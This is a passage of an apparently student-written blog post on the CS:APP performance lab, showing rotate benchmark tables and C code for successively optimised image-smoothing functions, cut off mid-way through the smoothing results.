46.4	65.9	94.5</span><br><span class="line">Speedup		    12.5	33.1	36.8	39.8	55.6	32.0</span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate_2: 8*8 blocking + loop unrolling + temporary caching:</span><br><span class="line">Dim		        64	    128	    256	    512	    1024	Mean</span><br><span class="line">Your CPEs	    2.5	    2.5	    2.5	    3.0	    3.3</span><br><span class="line">Baseline CPEs	14.7	40.1	46.4	65.9	94.5</span><br><span class="line">Speedup		    5.9	    15.8	18.2	22.1	28.6	16.1</span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate_3: 8*8 blocking + loop unrolling + marco RIDX reduced:</span><br><span class="line">Dim	            64	    128     256	    512	    1024	Mean</span><br><span class="line">Your CPEs	    1.2	    1.2	    1.2	    1.4	    2.1</span><br><span class="line">Baseline CPEs	14.7	40.1	46.4	65.9	94.5</span><br><span class="line">Speedup		    12.7	32.8	38.1	46.6	44.2	31.8</span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate_4: 4*4 blocking + loop unrolling + marco RIDX reduced:</span><br><span class="line">Dim             64      128	   256	   512   	1024	Mean</span><br><span class="line">Your CPEs	    1.2	    1.5	   1.5	   2.6	    4.2</span><br><span class="line">Baseline CPEs	14.7	40.1   46.4	   65.9	    94.5</span><br><span class="line">Speedup		    12.1	26.7   30.6	   25.3	    22.7	22.4</span><br><span class="line"></span><br><span class="line">Summary of Your Best Scores:</span><br><span class="line">  Rotate: 32.0 (rotate_1: 8*8 blocking + loop unrolling)</span><br></pre></td></tr></table></figure>
<p>8 * 8 is the best blocking strategy and loop unrolling plays a
critical role in optimization.</p>
<p><strong>Optimizing Convolution</strong></p>
<p>We compare the following convolution methods:</p>
<ul>
<li><code>naive_smooth</code>: naive implementation of convolution.</li>
<li><code>smooth_1</code>: inlining all function calls of
<code>naive_smooth</code>.</li>
<li><code>smooth_2</code>: separating 4 corners and 4 boundaries.</li>
<li><code>smooth_3</code>: separating corners/boundaries, plus loop
unrolling.</li>
</ul>
<p>Code for <code>naive_smooth</code> and <code>smooth_1</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">naive_smooth</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i++)</span><br><span class="line">	    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j++)</span><br><span class="line">	        dst[RIDX(i, j, dim)] = avg(dim, i, j, src);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">smooth_1</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">{</span><br><span class="line">   <span class="type">int</span> i, j, block_i, block_j, block_i_start, block_i_end, block_j_start, block_j_end;</span><br><span class="line">   <span class="type">int</span> sum_red, sum_blue, sum_green, n;</span><br><span class="line">   pixel temp;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i++)</span><br><span class="line">       <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j++) {</span><br><span class="line">            sum_red = <span class="number">0</span>;</span><br><span class="line">            sum_blue = <span class="number">0</span>;</span><br><span class="line">            sum_green = <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            block_i_start = max(i - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            block_i_end   = min(i + <span class="number">1</span>, dim - <span class="number">1</span>);</span><br><span class="line">            block_j_start = max(j - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            block_j_end   = min(j + <span class="number">1</span>, dim - <span class="number">1</span>);</span><br><span class="line">            n = (block_i_end - block_i_start + <span class="number">1</span>) * (block_j_end - block_j_start + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (block_i = block_i_start; block_i &lt;= block_i_end; block_i++)</span><br><span class="line">                <span class="keyword">for</span> (block_j = block_j_start; block_j &lt;= block_j_end; block_j++) {</span><br><span class="line">                    temp = src[(RIDX(block_i, block_j, dim))];</span><br><span class="line">                    sum_red   += (<span class="type">int</span>) temp.red;</span><br><span class="line">                    sum_blue  += (<span class="type">int</span>) temp.blue;</span><br><span class="line">                    sum_green += (<span class="type">int</span>) temp.green;</span><br><span class="line">                }</span><br><span class="line">            </span><br><span class="line">            temp.red   = sum_red / n;</span><br><span class="line">            temp.green = sum_green / n;</span><br><span class="line">            temp.blue  = sum_blue / n;</span><br><span class="line">            dst[RIDX(i, j, dim)] = temp;</span><br><span class="line">       }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>Code for <code>smooth_2</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_corners</span><span class="params">(<span class="type">int</span> dim, pixel* src, pixel* dst)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// Top left</span></span><br><span class="line">    <span class="type">int</span> sum_red = <span class="number">0</span>, sum_blue = <span class="number">0</span>, sum_green = <span class="number">0</span>;</span><br><span class="line">    sum_red += src[<span class="number">0</span>].red;       sum_blue  += src[<span class="number">0</span>].blue;       sum_green += src[<span class="number">0</span>].green;</span><br><span class="line">    sum_red += src[<span class="number">1</span>].red;       sum_blue  += src[<span class="number">1</span>].blue;       sum_green += src[<span class="number">1</span>].green;</span><br><span class="line">    sum_red += src[dim].red;     sum_blue  += src[dim].blue;     sum_green += src[dim].green;</span><br><span class="line">    sum_red += src[dim + <span class="number">1</span>].red; sum_blue  += src[dim + <span class="number">1</span>].blue; sum_green += src[dim + <span class="number">1</span>].green;</span><br><span class="line">    dst[<span class="number">0</span>].red = sum_red / <span class="number">4</span>;</span><br><span class="line">    dst[<span class="number">0</span>].blue = sum_blue / <span class="number">4</span>;</span><br><span class="line">    dst[<span class="number">0</span>].green = sum_green / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Top right</span></span><br><span class="line">    sum_red = <span class="number">0</span>, sum_blue = <span class="number">0</span>, sum_green = <span class="number">0</span>;</span><br><span class="line">    sum_red += src[dim - <span class="number">2</span>].red;       sum_blue  += src[dim - <span class="number">2</span>].blue;       sum_green += src[dim - <span class="number">2</span>].green;</span><br><span class="line">    sum_red += src[dim - <span class="number">1</span>].red;       sum_blue  += src[dim - <span class="number">1</span>].blue;       sum_green += src[dim - <span class="number">1</span>].green;</span><br><span class="line">    sum_red += src[<span class="number">2</span> * dim - <span class="number">2</span>].red;   sum_blue  += src[<span class="number">2</span> * dim - <span class="number">2</span>].blue;   sum_green += src[<span class="number">2</span> * dim - <span class="number">2</span>].green;</span><br><span class="line">    sum_red += src[<span class="number">2</span> * dim - <span class="number">1</span>].red;   sum_blue  += src[<span class="number">2</span> * dim - <span class="number">1</span>].blue;   sum_green += src[<span class="number">2</span> * dim - <span class="number">1</span>].green;</span><br><span class="line">    dst[dim - <span class="number">1</span>].red = sum_red / <span class="number">4</span>;</span><br><span class="line">    dst[dim - <span class="number">1</span>].blue = sum_blue / <span class="number">4</span>;</span><br><span class="line">    dst[dim - <span class="number">1</span>].green = sum_green / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bottom left</span></span><br><span class="line">    sum_red = <span class="number">0</span>, sum_blue = <span class="number">0</span>, sum_green = <span class="number">0</span>;</span><br><span class="line">    sum_red += src[dim * (dim - <span class="number">2</span>)].red;       sum_blue  += src[dim * (dim - <span class="number">2</span>)].blue;       sum_green += src[dim * (dim - <span class="number">2</span>)].green;</span><br><span class="line">    sum_red += src[dim * (dim - <span class="number">2</span>) + <span class="number">1</span>].red;   sum_blue  += src[dim * (dim - <span class="number">2</span>) + <span class="number">1</span>].blue;   sum_green += src[dim * (dim - <span class="number">2</span>) + <span class="number">1</span>].green;</span><br><span class="line">    sum_red += src[dim * (dim - <span class="number">1</span>)].red;       sum_blue  += src[dim * (dim - <span class="number">1</span>)].blue;       sum_green += src[dim * (dim - <span class="number">1</span>)].green;</span><br><span class="line">    sum_red += src[dim * (dim - <span class="number">1</span>) + <span class="number">1</span>].red;   sum_blue  += src[dim * (dim - <span class="number">1</span>) + <span class="number">1</span>].blue;   sum_green += src[dim * (dim - <span class="number">1</span>) + <span class="number">1</span>].green;</span><br><span class="line">    dst[dim * (dim - <span class="number">1</span>)].red = sum_red / <span class="number">4</span>;</span><br><span class="line">    dst[dim * (dim - <span class="number">1</span>)].blue = sum_blue / <span class="number">4</span>;</span><br><span class="line">    dst[dim * (dim - <span class="number">1</span>)].green = sum_green / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bottom right</span></span><br><span class="line">    sum_red = <span class="number">0</span>, sum_blue = <span class="number">0</span>, sum_green = <span class="number">0</span>;</span><br><span class="line">    sum_red += src[dim * (dim - <span class="number">1</span>) - <span class="number">2</span>].red; sum_blue  += src[dim * (dim - <span class="number">1</span>) - <span class="number">2</span>].blue; sum_green += src[dim * (dim - <span class="number">1</span>) - <span class="number">2</span>].green;</span><br><span class="line">    sum_red += src[dim * (dim - <span class="number">1</span>) - <span class="number">1</span>].red; sum_blue  += src[dim * (dim - <span class="number">1</span>) - <span class="number">1</span>].blue; sum_green += src[dim * (dim - <span class="number">1</span>) - <span class="number">1</span>].green;</span><br><span class="line">    sum_red += src[dim * dim - <span class="number">2</span>].red;       sum_blue  += src[dim * dim - <span class="number">2</span>].blue;       sum_green += src[dim * dim - <span class="number">2</span>].green;</span><br><span class="line">    sum_red += src[dim * dim - <span class="number">1</span>].red;       sum_blue  += src[dim * dim - <span class="number">1</span>].blue;       sum_green += src[dim * dim - <span class="number">1</span>].green;</span><br><span class="line">    dst[dim * dim - <span class="number">1</span>].red = sum_red / <span class="number">4</span>;</span><br><span class="line">    dst[dim * dim - <span class="number">1</span>].blue = sum_blue / <span class="number">4</span>;</span><br><span class="line">    dst[dim * dim - <span class="number">1</span>].green = sum_green / <span class="number">4</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_boundary_top</span><span class="params">(<span class="type">int</span> dim, pixel* src, pixel* dst)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> sum_red, sum_blue, sum_green;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; dim - <span class="number">1</span>; j++) {</span><br><span class="line">        sum_red = sum_blue = sum_green = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        sum_red += src[j - <span class="number">1</span>].red;       sum_blue += src[j - <span class="number">1</span>].blue;       sum_green += src[j - <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[j].red;           sum_blue += src[j].blue;           sum_green += src[j].green;</span><br><span class="line">        sum_red += src[j + <span class="number">1</span>].red;       sum_blue += src[j + <span class="number">1</span>].blue;       sum_green += src[j + <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[j + dim - <span class="number">1</span>].red; sum_blue += src[j + dim - <span class="number">1</span>].blue; sum_green += src[j + dim - <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[j + dim].red;     sum_blue += src[j + dim].blue;     sum_green += src[j + dim].green;</span><br><span class="line">        sum_red += src[j + dim + <span class="number">1</span>].red; sum_blue += src[j + dim + <span class="number">1</span>].blue; sum_green += src[j + dim + <span class="number">1</span>].green;</span><br><span class="line"></span><br><span class="line">        dst[j].red = sum_red / <span class="number">6</span>;</span><br><span class="line">        dst[j].blue = sum_blue / <span class="number">6</span>;</span><br><span class="line">        dst[j].green = sum_green / <span class="number">6</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_boundary_bottom</span><span class="params">(<span class="type">int</span> dim, pixel* src, pixel* dst)</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum_red, sum_blue, sum_green, idx;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> _dim = dim * (dim - <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; dim - <span class="number">1</span>; j++) {</span><br><span class="line">        sum_red = sum_blue = sum_green = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        sum_red += src[_dim + j - <span class="number">1</span>].red;       sum_blue += src[_dim + j - <span class="number">1</span>].blue;       sum_green += src[_dim + j - <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[_dim + j].red;           sum_blue += src[_dim + j].blue;           sum_green += src[_dim + j].green;</span><br><span class="line">        sum_red += src[_dim + j + <span class="number">1</span>].red;       sum_blue += src[_dim + j + <span class="number">1</span>].blue;       sum_green += src[_dim + j + <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[_dim + j - dim - <span class="number">1</span>].red; sum_blue += src[_dim + j - dim - <span class="number">1</span>].blue; sum_green += src[_dim + j - dim - <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[_dim + j - dim].red;     sum_blue += src[_dim + j - dim].blue;     sum_green += src[_dim + j - dim].green;</span><br><span class="line">        sum_red += src[_dim + j - dim + <span class="number">1</span>].red; sum_blue += src[_dim + j - dim + <span class="number">1</span>].blue; sum_green += src[_dim + j - dim + <span class="number">1</span>].green;</span><br><span class="line">    </span><br><span class="line">        idx = _dim + j;</span><br><span class="line">        dst[idx].red = sum_red / <span class="number">6</span>;</span><br><span class="line">        dst[idx].blue = sum_blue / <span class="number">6</span>;</span><br><span class="line">        dst[idx].green = sum_green / <span class="number">6</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_boundary_left</span><span class="params">(<span class="type">int</span> dim, pixel* src, pixel* dst)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> sum_red, sum_blue, sum_green, idx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; dim - <span class="number">1</span>; i++) {</span><br><span class="line">        sum_red = sum_blue = sum_green = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        sum_red += src[(i - <span class="number">1</span>) * dim].red;      sum_blue += src[(i - <span class="number">1</span>) * dim].blue;     sum_green += src[(i - <span class="number">1</span>) * dim].green;</span><br><span class="line">        sum_red += src[(i - <span class="number">1</span>) * dim + <span class="number">1</span>].red;  sum_blue += src[(i - <span class="number">1</span>) * dim + <span class="number">1</span>].blue; sum_green += src[(i - <span class="number">1</span>) * dim + <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[i * dim].red;            sum_blue += src[i * dim].blue;           sum_green += src[i * dim].green;</span><br><span class="line">        sum_red += src[i * dim + <span class="number">1</span>].red;        sum_blue += src[i * dim + <span class="number">1</span>].blue;       sum_green += src[i * dim + <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[(i + <span class="number">1</span>) * dim].red;      sum_blue += src[(i + <span class="number">1</span>) * dim].blue;     sum_green += src[(i + <span class="number">1</span>) * dim].green;</span><br><span class="line">        sum_red += src[(i + <span class="number">1</span>) * dim + <span class="number">1</span>].red;  sum_blue += src[(i + <span class="number">1</span>) * dim + <span class="number">1</span>].blue; sum_green += src[(i + <span class="number">1</span>) * dim + <span class="number">1</span>].green;</span><br><span class="line"></span><br><span class="line">        idx = i * dim;</span><br><span class="line">        dst[idx].red = sum_red / <span class="number">6</span>;</span><br><span class="line">        dst[idx].blue = sum_blue / <span class="number">6</span>;</span><br><span class="line">        dst[idx].green = sum_green / <span class="number">6</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_boundary_right</span><span class="params">(<span class="type">int</span> dim, pixel* src, pixel* dst)</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum_red, sum_blue, sum_green, idx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; dim - <span class="number">1</span>; i++) {</span><br><span class="line">        sum_red = sum_blue = sum_green = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        sum_red += src[i * dim - <span class="number">1</span>].red;       sum_blue += src[i * dim - <span class="number">1</span>].blue;       sum_green += src[i * dim - <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[i * dim - <span class="number">2</span>].red;       sum_blue += src[i * dim - <span class="number">2</span>].blue;       sum_green += src[i * dim - <span class="number">2</span>].green;</span><br><span class="line">        sum_red += src[(i + <span class="number">1</span>) * dim - <span class="number">1</span>].red; sum_blue += src[(i + <span class="number">1</span>) * dim - <span class="number">1</span>].blue; sum_green += src[(i + <span class="number">1</span>) * dim - <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[(i + <span class="number">1</span>) * dim - <span class="number">2</span>].red; sum_blue += src[(i + <span class="number">1</span>) * dim - <span class="number">2</span>].blue; sum_green += src[(i + <span class="number">1</span>) * dim - <span class="number">2</span>].green;</span><br><span class="line">        sum_red += src[(i + <span class="number">2</span>) * dim - <span class="number">1</span>].red; sum_blue += src[(i + <span class="number">2</span>) * dim - <span class="number">1</span>].blue; sum_green += src[(i + <span class="number">2</span>) * dim - <span class="number">1</span>].green;</span><br><span class="line">        sum_red += src[(i + <span class="number">2</span>) * dim - <span class="number">2</span>].red; sum_blue += src[(i + <span class="number">2</span>) * dim - <span class="number">2</span>].blue; sum_green += src[(i + <span class="number">2</span>) * dim - <span class="number">2</span>].green;</span><br><span class="line"></span><br><span class="line">        idx = (i + <span class="number">1</span>) * dim - <span class="number">1</span>;</span><br><span class="line">        dst[idx].red = sum_red / <span class="number">6</span>;</span><br><span class="line">        dst[idx].blue = sum_blue / <span class="number">6</span>;</span><br><span class="line">        dst[idx].green = sum_green / <span class="number">6</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_inner</span><span class="params">(<span class="type">int</span> dim, pixel* src, pixel* dst)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j, block_i, block_j, idx;</span><br><span class="line">    <span class="type">int</span> sum_red, sum_blue, sum_green;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; dim - <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; dim - <span class="number">1</span>; j++) {</span><br><span class="line">            sum_red = sum_blue = sum_green = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (block_i = i - <span class="number">1</span>; block_i &lt;= i + <span class="number">1</span>; block_i++)</span><br><span class="line">                <span class="keyword">for</span> (block_j = j - <span class="number">1</span>; block_j &lt;= j + <span class="number">1</span>; block_j++) {</span><br><span class="line">                    idx = RIDX(block_i, block_j, dim);</span><br><span class="line">                    sum_red += src[idx].red;</span><br><span class="line">                    sum_blue += src[idx].blue;</span><br><span class="line">                    sum_green += src[idx].green;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">            idx = RIDX(i, j, dim);</span><br><span class="line">            dst[idx].red = sum_red / <span class="number">9</span>;</span><br><span class="line">            dst[idx].blue = sum_blue / <span class="number">9</span>;</span><br><span class="line">            dst[idx].green = sum_green / <span class="number">9</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">smooth_2</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">{</span><br><span class="line">    set_corners(dim, src, dst);</span><br><span class="line">    set_boundary_top(dim, src, dst);</span><br><span class="line">    set_boundary_bottom(dim, src, dst);</span><br><span class="line">    set_boundary_left(dim, src, dst);</span><br><span class="line">    set_boundary_right(dim, src, dst);</span><br><span class="line">    set_inner(dim, src, dst);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>Code for <code>smooth_3</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_inner_unrolling</span><span class="params">(<span class="type">int</span> dim, pixel* src, pixel* dst)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j, idx;</span><br><span class="line">    <span class="type">int</span> sum_red, sum_blue, sum_green;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; dim - <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; dim - <span class="number">1</span>; j++) {</span><br><span class="line">            sum_red = sum_blue = sum_green = <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            idx = RIDX(i - <span class="number">1</span>, j - <span class="number">1</span>, dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i - <span class="number">1</span>, j    , dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i - <span class="number">1</span>, j + <span class="number">1</span>, dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i    , j - <span class="number">1</span>, dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i    , j    , dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i    , j + <span class="number">1</span>, dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i + <span class="number">1</span>, j - <span class="number">1</span>, dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i + <span class="number">1</span>, j    , dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line">            idx = RIDX(i + <span class="number">1</span>, j + <span class="number">1</span>, dim); sum_red += src[idx].red; sum_blue += src[idx].blue; sum_green += src[idx].green;</span><br><span class="line"></span><br><span class="line">            idx = RIDX(i, j, dim);</span><br><span class="line">            dst[idx].red = sum_red / <span class="number">9</span>;</span><br><span class="line">            dst[idx].blue = sum_blue / <span class="number">9</span>;</span><br><span class="line">            dst[idx].green = sum_green / <span class="number">9</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">smooth_3</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">{</span><br><span class="line">    set_corners(dim, src, dst);</span><br><span class="line">    set_boundary_top(dim, src, dst);</span><br><span class="line">    set_boundary_bottom(dim, src, dst);</span><br><span class="line">    set_boundary_left(dim, src, dst);</span><br><span class="line">    set_boundary_right(dim, src, dst);</span><br><span class="line">    set_inner_unrolling(dim, src, dst);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>Results:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Smooth: Version = smooth_0: naive implementation:</span><br><span class="line">Dim		        32	    64	    128	    256	    512	    Mean</span><br><span class="line">Your CPEs	    16.0	15.7	16.0	16.0	15.7</span><br><span class="line">Baseline CPEs	695.0	698.0	702.0	717.0	722.0</span><br><span class="line">Speedup		    43.4	44.4	44.0	44.9	46.0	44.5</span><br><span class="line"></span><br><span class="line">Smooth: Version = smooth_1: no function calls:</span><br><span class="line">Dim		        32	    64	    128	    256	    512	    Mean</span><br><span class="line">Your CPEs	    16.2	15.7	16.0	15.5	15.7</span><br><span class="line">Baseline 